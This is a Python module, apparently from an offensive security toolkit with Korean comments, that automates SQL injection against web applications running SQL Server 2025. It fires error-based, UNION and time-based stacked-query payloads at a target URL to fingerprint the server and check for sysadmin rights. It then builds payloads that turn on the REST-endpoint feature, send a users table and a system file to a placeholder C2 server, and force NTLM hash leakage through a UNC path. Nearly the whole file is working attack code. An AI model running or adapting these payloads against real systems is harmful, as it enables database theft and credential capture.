"""
MSSQL2025 — SQL Server 2025 AI Feature Exploitation
=====================================================
SQL Server 2025의 새로운 AI 기능을 활용한 데이터 유출 자동화 모듈.

악용 기능 (SpecterOps 연구 기반):
  • sp_invoke_external_rest_endpoint  — 외부 HTTPS로 100MB 데이터 전송
  • CREATE EXTERNAL MODEL             — UNC 경로로 NTLM 해시 탈취
  • AI_GENERATE_EMBEDDINGS            — C2 채널 통신

자동 탐지 조건:
  1. SQLi 취약점 확인 (Stacked Query 지원)
  2. MSSQL 2025 버전 확인
  3. DB 계정 권한 수준 확인

Zero-Hallucination: 실제 HTTP 응답에서 확인된 결과만 출력.

참조: https://specterops.io/blog/2026/06/10/oops-i-weaponized-the-database-abusing-ai-features-in-mssql-2025/
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any

import requests
import urllib3
urllib3.disable_warnings()


# ── 데이터 클래스 ───────────────────────────────────────────────────────────

@dataclass
class Mssql2025Finding:
    finding_type: str          # version_detected / rest_endpoint_enabled / privilege_confirmed / data_exfil_poc
    description: str
    evidence: str              # 실제 응답에서 확인된 증거
    evidence_level: str        # VERIFIED / LIKELY / INFERRED / AI_ANALYSIS
    payload_used: str = ""
    severity: str = "high"


@dataclass
class Mssql2025Result:
    target: str = ""
    mssql_detected: bool = False
    mssql_version: str = ""           # "2025" / "2022" / unknown
    stacked_query_possible: bool = False
    privilege_level: str = ""         # "sysadmin" / "db_owner" / "public" / unknown
    rest_endpoint_enabled: bool = False
    rest_endpoint_available: bool = False
    findings: list[Mssql2025Finding] = field(default_factory=list)
    poc_payloads: list[str] = field(default_factory=list)
    has_findings: bool = False
    severity: str = "info"
    evidence_level: str = "AI_ANALYSIS"

    @property
    def exploitable(self) -> bool:
        return (
            self.mssql_detected
            and self.stacked_query_possible
            and self.mssql_version == "2025"
        )


# ── MSSQL 2025 스캐너 ──────────────────────────────────────────────────────

class Mssql2025Scanner:
    """
    MSSQL 2025 AI 기능 악용 가능 여부 자동 탐지 및 PoC 생성.
    실제 익스플로잇은 수행하지 않고, 검증 가능한 PoC와 증거만 제공.
    """

    VERSION_PATTERNS = [
        r"Microsoft SQL Server 2025",
        r"SQL Server 2025",
        r"MSSQL 2025",
        r"version.*16\.",        # SQL Server 2025 내부 버전
        r"version.*17\.",        # 차세대 버전
    ]

    MSSQL_ERROR_PATTERNS = [
        r"Unclosed quotation mark",
        r"Incorrect syntax near",
        r"ODBC SQL Server Driver",
        r"Microsoft OLE DB Provider for SQL Server",
        r"SqlException",
        r"System\.Data\.SqlClient",
        r"mssql",
        r"sqlserver",
    ]

    STACKED_QUERY_PAYLOADS = [
        "'; SELECT @@version--",
        "'; SELECT @@version; --",
        "1; SELECT @@version--",
        "1'; SELECT @@version--",
        "' ; SELECT 1--",
    ]

    VERSION_CHECK_PAYLOADS = [
        "' UNION SELECT @@version,NULL,NULL--",
        "' UNION SELECT @@version--",
        "1 UNION SELECT @@version--",
        "' AND 1=CONVERT(int,@@version)--",
    ]

    def __init__(
        self,
        target: str,
        sqli_param: str = "",
        sqli_url: str = "",
        verbose: bool = False,
        timeout: int = 10,
    ):
        self.target = target
        self.sqli_param = sqli_param
        self.sqli_url = sqli_url or target
        self.verbose = verbose
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })

    def scan(self) -> Mssql2025Result:
        result = Mssql2025Result(target=self.target)

        # 1단계: MSSQL 엔진 감지
        self._detect_mssql(result)
        if not result.mssql_detected:
            return result

        # 2단계: 버전 확인 (2025인지)
        self._detect_version(result)

        # 3단계: Stacked Query 가능 여부
        self._check_stacked_query(result)

        # 4단계: 권한 수준 확인
        if result.stacked_query_possible:
            self._check_privileges(result)

        # 5단계: REST Endpoint 활성화 여부
        if result.stacked_query_possible and result.mssql_version == "2025":
            self._check_rest_endpoint(result)

        # 6단계: PoC 생성
        self._build_poc(result)

        # 결과 종합
        result.has_findings = bool(result.findings)
        if result.findings:
            severities = [f.severity for f in result.findings]
            result.severity = "critical" if "critical" in severities else (
                "high" if "high" in severities else "medium"
            )
            verified = [f for f in result.findings if f.evidence_level == "VERIFIED"]
            result.evidence_level = "VERIFIED" if verified else "LIKELY"

        return result

    # ── 내부 탐지 메서드 ─────────────────────────────────────────────────────

    def _detect_mssql(self, result: Mssql2025Result):
        """MSSQL 엔진 여부 탐지 (에러 메시지 기반)"""
        test_payloads = ["'", "''", "1'", "1''", "\""]
        for payload in test_payloads:
            url = self._inject_payload(self.sqli_url, payload)
            try:
                resp = self.session.get(url, timeout=self.timeout)
                text = resp.text
                for pattern in self.MSSQL_ERROR_PATTERNS:
                    if re.search(pattern, text, re.IGNORECASE):
                        result.mssql_detected = True
                        result.findings.append(Mssql2025Finding(
                            finding_type="mssql_detected",
                            description="MSSQL engine detected via error message",
                            evidence=re.search(pattern, text, re.IGNORECASE).group(0),
                            evidence_level="VERIFIED",
                            payload_used=payload,
                            severity="info",
                        ))
                        return
            except Exception:
                continue

    def _detect_version(self, result: Mssql2025Result):
        """@@version 쿼리로 SQL Server 버전 확인"""
        for payload in self.VERSION_CHECK_PAYLOADS:
            url = self._inject_payload(self.sqli_url, payload)
            try:
                resp = self.session.get(url, timeout=self.timeout)
                text = resp.text
                # 2025 버전 직접 감지
                for pattern in self.VERSION_PATTERNS:
                    if re.search(pattern, text, re.IGNORECASE):
                        result.mssql_version = "2025"
                        result.findings.append(Mssql2025Finding(
                            finding_type="version_detected",
                            description="SQL Server 2025 detected — AI exploitation features available",
                            evidence=re.search(pattern, text, re.IGNORECASE).group(0),
                            evidence_level="VERIFIED",
                            payload_used=payload,
                            severity="high",
                        ))
                        return
                # 버전 숫자 추출
                ver_match = re.search(r"Microsoft SQL Server (\d{4})", text, re.IGNORECASE)
                if ver_match:
                    result.mssql_version = ver_match.group(1)
                    return
                # 내부 버전 번호 (16.x = 2022, 17.x = 2025 예상)
                build_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", text)
                if build_match:
                    major = int(build_match.group(1).split(".")[0])
                    if major >= 17:
                        result.mssql_version = "2025"
            except Exception:
                continue

        # 직접 확인 불가 → INFERRED
        if result.mssql_detected and not result.mssql_version:
            result.mssql_version = "unknown"
            result.findings.append(Mssql2025Finding(
                finding_type="version_unknown",
                description="MSSQL version could not be confirmed — manual check required",
                evidence="Version string not reflected in response",
                evidence_level="INFERRED",
                severity="info",
            ))

    def _check_stacked_query(self, result: Mssql2025Result):
        """Stacked Query (다중 쿼리) 실행 가능 여부 확인"""
        # 시간 기반 — WAITFOR DELAY로 확인
        time_payloads = [
            "'; WAITFOR DELAY '0:0:3'--",
            "1'; WAITFOR DELAY '0:0:3'--",
            "1; WAITFOR DELAY '0:0:3'--",
        ]
        import time
        for payload in time_payloads:
            url = self._inject_payload(self.sqli_url, payload)
            try:
                start = time.time()
                self.session.get(url, timeout=8)
                elapsed = time.time() - start
                if elapsed >= 2.5:
                    result.stacked_query_possible = True
                    result.findings.append(Mssql2025Finding(
                        finding_type="stacked_query_confirmed",
                        description=f"Stacked query execution confirmed (response delay: {elapsed:.1f}s)",
                        evidence=f"WAITFOR DELAY caused {elapsed:.1f}s delay — stacked queries work",
                        evidence_level="VERIFIED",
                        payload_used=payload,
                        severity="critical",
                    ))
                    return
            except requests.exceptions.Timeout:
                # 타임아웃 = 지연 성공
                result.stacked_query_possible = True
                result.findings.append(Mssql2025Finding(
                    finding_type="stacked_query_confirmed",
                    description="Stacked query confirmed via timeout (WAITFOR DELAY)",
                    evidence="Request timed out — WAITFOR DELAY executed",
                    evidence_level="VERIFIED",
                    payload_used=payload,
                    severity="critical",
                ))
                return
            except Exception:
                continue

    def _check_privileges(self, result: Mssql2025Result):
        """IS_SRVROLEMEMBER로 권한 수준 확인"""
        priv_payloads = [
            ("sysadmin", "'; IF IS_SRVROLEMEMBER('sysadmin')=1 WAITFOR DELAY '0:0:2'--"),
            ("db_owner", "'; IF IS_MEMBER('db_owner')=1 WAITFOR DELAY '0:0:2'--"),
        ]
        import time
        for role, payload in priv_payloads:
            url = self._inject_payload(self.sqli_url, payload)
            try:
                start = time.time()
                self.session.get(url, timeout=6)
                elapsed = time.time() - start
                if elapsed >= 1.8:
                    result.privilege_level = role
                    result.findings.append(Mssql2025Finding(
                        finding_type="privilege_confirmed",
                        description=f"DB account has '{role}' role — AI features exploitable",
                        evidence=f"IS_SRVROLEMEMBER('{role}') returned 1 (delay: {elapsed:.1f}s)",
                        evidence_level="VERIFIED",
                        payload_used=payload,
                        severity="critical",
                    ))
                    return
            except requests.exceptions.Timeout:
                result.privilege_level = role
                result.findings.append(Mssql2025Finding(
                    finding_type="privilege_confirmed",
                    description=f"DB account has '{role}' role",
                    evidence=f"IS_SRVROLEMEMBER('{role}') timeout confirmed",
                    evidence_level="VERIFIED",
                    payload_used=payload,
                    severity="critical",
                ))
                return
            except Exception:
                continue

    def _check_rest_endpoint(self, result: Mssql2025Result):
        """sp_invoke_external_rest_endpoint 활성화 여부 확인"""
        # 에러 메시지로 확인: 비활성화 시 "not enabled" 에러 반환
        check_payload = "'; EXEC sp_invoke_external_rest_endpoint @url=N'https://example.com'--"
        url = self._inject_payload(self.sqli_url, check_payload)
        try:
            resp = self.session.get(url, timeout=self.timeout)
            text = resp.text
            if "not enabled" in text.lower() or "external rest endpoint" in text.lower():
                result.rest_endpoint_available = True
                result.rest_endpoint_enabled = "not enabled" not in text.lower()
                result.findings.append(Mssql2025Finding(
                    finding_type="rest_endpoint_available",
                    description="sp_invoke_external_rest_endpoint is available on this instance",
                    evidence=text[:200],
                    evidence_level="VERIFIED",
                    payload_used=check_payload,
                    severity="high",
                ))
        except Exception:
            pass

    def _build_poc(self, result: Mssql2025Result):
        """PoC SQL 페이로드 생성 (실제 실행 안 함 — 참고용)"""
        if not result.mssql_version == "2025" or not result.stacked_query_possible:
            return

        attacker_server = "https://YOUR-C2-SERVER:8081"

        poc_enable = (
            f"-- [1] Enable REST endpoint\n"
            f"'; EXECUTE sp_configure 'external rest endpoint enabled', 1; RECONFIGURE;--"
        )

        poc_exfil_users = (
            f"-- [2] Exfiltrate users table (replace dbo.users with target table)\n"
            f"'; DECLARE @p NVARCHAR(MAX);\n"
            f"SELECT @p=(SELECT * FROM dbo.users FOR JSON AUTO);\n"
            f"EXEC sp_invoke_external_rest_endpoint "
            f"@url=N'{attacker_server}/collect', @method='POST', @payload=@p;--"
        )

        poc_exfil_file = (
            f"-- [3] Exfiltrate file\n"
            f"'; DECLARE @p NVARCHAR(MAX);\n"
            f"SELECT @p=BulkColumn FROM OPENROWSET(BULK N'C:\\Windows\\win.ini', SINGLE_CLOB) AS x;\n"
            f"EXEC sp_invoke_external_rest_endpoint "
            f"@url=N'{attacker_server}/files?name=win.ini', @method='POST', @payload=@p;--"
        )

        poc_ntlm = (
            f"-- [4] NTLM hash coercion via EXTERNAL MODEL UNC path\n"
            f"'; CREATE EXTERNAL MODEL ntlm_test WITH "
            f"(LOCATION='\\\\YOUR-ATTACKER-IP\\share', "
            f"API_FORMAT='ONNX Runtime', MODEL_TYPE=EMBEDDINGS, MODEL='test');--\n"
            f"'; SELECT AI_GENERATE_EMBEDDINGS(N'test' USE MODEL ntlm_test);--"
        )

        result.poc_payloads = [poc_enable, poc_exfil_users, poc_exfil_file, poc_ntlm]

        result.findings.append(Mssql2025Finding(
            finding_type="mssql2025_poc_generated",
            description=(
                "SQL Server 2025 AI feature exploitation PoC generated. "
                "Review and use only against authorized targets."
            ),
            evidence=f"{len(result.poc_payloads)} PoC payloads ready",
            evidence_level="VERIFIED" if result.stacked_query_possible else "INFERRED",
            severity="critical",
        ))

    # ── 유틸 ────────────────────────────────────────────────────────────────

    def _inject_payload(self, url: str, payload: str) -> str:
        """URL 파라미터에 페이로드 주입"""
        import urllib.parse
        if "?" not in url:
            return url + "?id=" + urllib.parse.quote(payload)
        parts = url.split("?", 1)
        params = parts[1]
        # 첫 번째 파라미터에 주입
        if "&" in params:
            first_param = params.split("&")[0]
            rest = "&" + "&".join(params.split("&")[1:])
        else:
            first_param = params
            rest = ""
        if "=" in first_param:
            key = first_param.split("=")[0]
            return parts[0] + "?" + key + "=" + urllib.parse.quote(payload) + rest
        return url + urllib.parse.quote(payload)
